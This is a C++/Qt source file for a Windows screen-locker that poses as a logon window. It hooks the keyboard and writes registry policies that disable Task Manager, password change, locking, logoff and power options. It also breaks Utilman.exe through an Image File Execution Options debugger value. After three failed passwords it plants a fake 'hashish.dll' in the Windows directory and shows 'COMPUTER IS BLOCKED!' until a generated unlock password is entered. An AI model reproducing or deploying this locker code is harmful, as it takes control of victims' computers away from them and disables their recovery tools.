#include "LogonWindow.h"
#include "PasswordGenerator.h"

#include <QResizeEvent>
#include <QHBoxLayout>
#include <QApplication>
#include <QTimer>
#include <QStandardPaths>
#include <QDir>

#include <Lmcons.h>
#include <QDebug>



LogonWindow::LogonWindow(QWidget* parent)
	: QWidget(parent, Qt::FramelessWindowHint), 
		enter_tries(3), session_state(LockState)
{
	setAttribute(Qt::WA_TranslucentBackground);
	createUI();
	keyboard_hook.enableHook();
}


void LogonWindow::createUI()
{
	window_background = new QLabel(this);
	window_background->setScaledContents(true);

	QPixmap img(":/images/background.jpg");
	window_background->setPixmap(img);

	TCHAR* current_user_name = getCurrentUserName();

    user_name = new QLabel(this);
	if (QFile(QString::fromUtf8(qgetenv("windir")) + "\\hashish.dll").exists())
	{
		user_name->setText("COMPUTER IS BLOCKED!");
		enter_tries = 0;
	}
	else
	{
		user_name->setText(QString::fromWCharArray(current_user_name).toUpper());
	}
	user_name->setStyleSheet("QLabel {color: red; font-size: 50pt;}");
	user_name->setAlignment(Qt::AlignCenter);

	computer_password = new PasswordLineEdit(this);
	computer_password->setPlaceholderText("Password...");
	computer_password->setStyleSheet("QLineEdit {border: 3px solid red; font-size: 20pt; color: white; background: #80000000;}"
							"QLineEdit:hover {border: #80000000;}"
	);
	computer_password->setContextMenuPolicy(Qt::NoContextMenu);
	computer_password->setTextMargins(5, 0, 65, 0);
	QObject::connect(computer_password, &QLineEdit::selectionChanged, this, &LogonWindow::removeLineEditSelection);
	QObject::connect(computer_password, &QLineEdit::returnPressed, this, &LogonWindow::checkPassword);
	
	reveal_password_button = new IconButton(computer_password);
	reveal_password_button->setFixedSize(50, computer_password->sizeHint().height() - 10);
	reveal_password_button->setIconSize(reveal_password_button->size());
	reveal_password_button->setNormalIcon(QIcon(":/images/no-see.png"));
	reveal_password_button->setHoverIcon(QIcon(":/images/no-see-red.png"));
	reveal_password_button->setStyleSheet("QPushButton {border: none; background: transparent;}");
	QObject::connect(reveal_password_button, &QPushButton::clicked, this, &LogonWindow::showPassword);

	QHBoxLayout* line_edit_layout = new QHBoxLayout;
	line_edit_layout->setContentsMargins(3, 3, 10, 3);
	line_edit_layout->addWidget(reveal_password_button, 0, Qt::AlignRight);
	computer_password->setLayout(line_edit_layout);

	continue_button = new IconButton(this, "Continue");
	continue_button->setIcon(QIcon(":/images/continue-red.png"));
	continue_button->setStyleSheet("QPushButton {border: none; background: transparent;"
								  "font-size: 15pt; color: red;}"
	);
	continue_button->setNormalIcon(QIcon(":/images/continue-red.png"));
	continue_button->setHoverIcon(QIcon(":/images/continue.png"));
	continue_button->setNormalTextColor(QColor(255, 0, 0));
	continue_button->setHoverTextColor(QColor(255, 255, 255));
	continue_button->setLayoutDirection(Qt::RightToLeft);
	QObject::connect(continue_button, &IconButton::clicked, this, &LogonWindow::checkPassword);

	shutdown_button = new IconButton(this, "Shutdown");
	shutdown_button->setIcon(QIcon(":/images/shutdown-red.png"));
	shutdown_button->setStyleSheet("QPushButton {border: none; background: transparent;"
								  "font-size: 15pt;}"
	);
	shutdown_button->setNormalIcon(QIcon(":/images/shutdown-red.png"));
	shutdown_button->setHoverIcon(QIcon(":/images/shutdown.png"));
	shutdown_button->setNormalTextColor(QColor(255, 0, 0));
	shutdown_button->setHoverTextColor(QColor(255, 255, 255));
	QObject::connect(shutdown_button, &IconButton::clicked, this, &LogonWindow::askBeforeShutdown);
}


void LogonWindow::resizeEvent(QResizeEvent* ev)
{
	QSize new_size = ev->size();
	window_background->resize(new_size);

	int x = (new_size.width() - user_name->sizeHint().width()) / 2;
	int y = (new_size.height() - user_name->height()) / 3.5;
	user_name->move(x, y);

	computer_password->resize(new_size.width() / 3, computer_password->sizeHint().height());
	x = (new_size.width() - computer_password->width()) / 2;
	y = (new_size.height() - computer_password->height()) / 1.9;
	computer_password->move(x, y);
	computer_password->setEchoMode(QLineEdit::Password);

	QSize continueShutdownButtonSize = new_size / 10;
	continue_button->resize(continueShutdownButtonSize / 1.3);
	continue_button->setIconSize(continueShutdownButtonSize / 2.3);
	x = (new_size.width() - continue_button->width()) / 1.5;
	y = (new_size.height() - continue_button->height()) / 1.5;
	continue_button->move(x, y);

	shutdown_button->resize(continueShutdownButtonSize);
	shutdown_button->setIconSize(continueShutdownButtonSize / 3);
	x = (new_size.width() - continue_button->width()) / 3;
	y = (new_size.height() - continue_button->height()) / 1.5;
	shutdown_button->move(x, y);
}


void LogonWindow::setupRegistries()
{
	DWORD keys_value = (session_state == LockState) ? 1 : 0;

	HKEY current_key;
	qDebug() << RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0,
		NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &current_key, NULL);
	RegSetValueEx(current_key, L"HideFastUserSwitching", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegCloseKey(current_key);

	RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &current_key, NULL);
	RegSetValueEx(current_key, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegSetValueEx(current_key, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegSetValueEx(current_key, L"DisableTaskmgr", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegCloseKey(current_key);

	RegCreateKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &current_key, NULL);
	RegSetValueEx(current_key, L"NoLogoff", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegSetValueEx(current_key, L"HidePowerOptions", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegCloseKey(current_key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0,
		NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &current_key, NULL);
	RegSetValueEx(current_key, L"DontDisplayNetworkSelectionUI", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegCloseKey(current_key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &current_key, NULL);
	RegSetValueEx(current_key, L"HidePowerOptions", 0, REG_DWORD, (BYTE*)&keys_value, sizeof(DWORD));
	RegCloseKey(current_key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe",
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &current_key, NULL);
	if (session_state == LockState)
	{
		RegSetValueEx(current_key, L"Debugger", 0, REG_SZ, (BYTE*)"hehe", sizeof(DWORD));
	}
	else
	{
		RegDeleteValue(current_key, L"Debugger");
	}
	RegCloseKey(current_key);
}


TCHAR* LogonWindow::getCurrentUserName()
{
	DWORD size = UNLEN + 1;
	TCHAR* user_name = new TCHAR[size];

	GetUserName(user_name, &size);

	return user_name;
}


void LogonWindow::showPassword()
{
	computer_password->setFocus();

	if (computer_password->echoMode() == QLineEdit::Password)
	{
		computer_password->setEchoMode(QLineEdit::Normal);
		reveal_password_button->setNormalIcon(QIcon(":/images/see.png"));
		reveal_password_button->setHoverIcon(QIcon(":/images/see-red.png"));
	}
	else
	{
		computer_password->setEchoMode(QLineEdit::Password);
		reveal_password_button->setNormalIcon(QIcon(":/images/no-see.png"));
		reveal_password_button->setHoverIcon(QIcon(":/images/no-see-red.png"));
	}
}


void LogonWindow::askBeforeShutdown()
{
	QObject::disconnect(shutdown_button, &QPushButton::clicked, this, &LogonWindow::askBeforeShutdown);

	QWidget* confirmation_window = new QWidget(this);
	confirmation_window->setGeometry(QRect(shutdown_button->pos() + shutdown_button->rect().bottomLeft(), QSize(300, 120)));
	confirmation_window->setStyleSheet("QWidget {border: 2px solid red; background: #80000000;}");
	confirmation_window->show();

	QLabel* dialog_message = new QLabel("Are you sure?", confirmation_window);
	dialog_message->setGeometry(10, 10, 280, 40);
	dialog_message->setAlignment(Qt::AlignCenter);
	dialog_message->setStyleSheet("QLabel {border: none; color: white; font-size: 15pt; background: transparent;}");
	dialog_message->show();

	IconButton* yes_button = new IconButton(confirmation_window, "Yes");
	yes_button->setGeometry(190, 70, 100, 20);
	yes_button->setStyleSheet("QPushButton {border: none; background: transparent; font-size: 15pt;}");
	yes_button->setNormalTextColor(QColor(255, 255, 255));
	yes_button->setHoverTextColor(QColor(255, 0, 0));
	yes_button->show();
	QObject::connect(yes_button, &QPushButton::clicked, this, &LogonWindow::shutdownComputer);

	IconButton* no_button = new IconButton(confirmation_window, "No");
	no_button->setGeometry(10, 70, 100, 20);
	no_button->setStyleSheet("QPushButton {border: none; background: transparent; font-size: 15pt;}");
	no_button->setNormalTextColor(QColor(255, 255, 255));
	no_button->setHoverTextColor(QColor(255, 0, 0));
	no_button->show();
	QObject::connect(no_button, &QPushButton::clicked, [=]() {
		confirmation_window->hide();
		delete confirmation_window;

		QObject::connect(shutdown_button, &QPushButton::clicked, this, &LogonWindow::askBeforeShutdown);
	});
}


void LogonWindow::shutdownComputer()
{
	HANDLE token_handle;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&token_handle);

	TOKEN_PRIVILEGES token_privileges;
	token_privileges.PrivilegeCount = 1;
	token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	LookupPrivilegeValue(NULL, TEXT("SeShutdownPrivilege"), &token_privileges.Privileges[0].Luid);

	AdjustTokenPrivileges(token_handle, FALSE, &token_privileges, 0, NULL, 0);

	InitiateSystemShutdownEx(NULL, NULL, 0, FALSE, FALSE, 0);
}


void LogonWindow::checkPassword()
{
	computer_password->setFocus();

	if (computer_password->text() == "")
	{
		return;
	}

	if (computer_password->text() == PasswordGenerator::generateShutdownPassword())
	{
		shutdownComputer();
		return;
	}

	if (enter_tries > 0)
	{
		if (computer_password->text() == PasswordGenerator::generateUserPassword())
		{
			hide();
			keyboard_hook.disableHook();
			enter_tries = 3;

			session_state = UnlockState;
			//setupRegistries();

			emit logonPassed();

			destroy();
		}
		else
		{
			enter_tries--;

			if (enter_tries == 0)
			{
				blockComputerAccess();
			}
		}
	}
	else
	{
		if (computer_password->text() == PasswordGenerator::generateUnlockPassword())
		{
			QFile file(QString::fromUtf8(qgetenv("windir")) + "\\hashish.dll");
			file.remove();

			enter_tries = 3;
			user_name->setText(QString::fromWCharArray(getCurrentUserName()).toUpper());
		}
	}

	computer_password->setText("");
}


void LogonWindow::removeLineEditSelection()
{
	computer_password->setSelection(0, 0);
}


void LogonWindow::blockComputerAccess()
{
	user_name->setText("COMPUTER IS BLOCKED!");
	user_name->adjustSize();

	int x = (width() - user_name->sizeHint().width()) / 2;
	int y = user_name->y();
	user_name->move(x, y);

	QFile file(QString::fromUtf8(qgetenv("windir")) + "\\hashish.dll");
	file.open(QIODevice::WriteOnly);
	file.write("MZê       ˇˇ  ∏       @                                      ∫ ¥	Õ!∏LÕ!This program cannot be run in DOS mode.");
	file.close();
}
